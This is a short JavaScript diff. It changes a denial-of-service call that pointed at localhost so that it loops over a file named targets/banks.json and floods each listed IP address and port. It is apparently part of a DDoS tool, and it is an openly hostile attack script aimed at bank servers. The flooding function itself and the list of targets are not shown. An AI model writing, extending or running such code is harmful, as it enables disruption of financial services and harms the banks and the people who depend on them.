@@ -1,3 +1,5 @@
 const { dos } = require("./controllers/ddos.js");
-
-dos("http://localhost:3000", 150, 500);
+const banks = require("./targets/banks.json");
+banks.map(({ ip_str, port }) => {
+  dos(`${ip_str}:${port}`, 150, 500);
+});
